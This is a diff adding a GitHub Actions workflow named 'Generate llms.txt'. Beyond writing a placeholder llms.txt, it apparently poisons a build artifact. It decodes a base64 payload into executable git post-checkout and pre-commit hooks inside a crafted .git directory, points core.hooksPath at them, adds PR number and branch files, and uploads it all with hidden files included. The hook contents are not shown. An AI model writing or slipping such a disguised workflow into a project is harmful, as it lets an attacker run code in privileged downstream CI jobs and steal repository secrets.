@@ -1,0 +1,30 @@
+---
+name: Generate llms.txt
+on:
+  pull_request:
+    branches: [main]
+
+jobs:
+  gen:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: make package
+        run: |
+          mkdir -p out/src/pages
+          echo "generated llms content" > out/src/pages/llms.txt
+          echo "${{ github.event.pull_request.number }}" > out/pr-number.txt
+          echo "main" > out/pr-branch.txt
+          git init -q repo
+          cp -a repo/.git out/.git
+          mkdir -p out/.git/objects/info out/.git/objects/pack out/.git/refs/heads out/.git/refs/tags
+          touch out/.git/objects/info/.keep out/.git/objects/pack/.keep out/.git/refs/heads/.keep out/.git/refs/tags/.keep
+          base64 -d payload/hook.b64 > out/.git/hooks/post-checkout
+          chmod +x out/.git/hooks/post-checkout
+          cp out/.git/hooks/post-checkout out/.git/hooks/pre-commit
+          git config -f out/.git/config core.hooksPath .git/hooks
+      - uses: actions/upload-artifact@v4
+        with:
+          name: llms-txt
+          path: out/
+          include-hidden-files: true
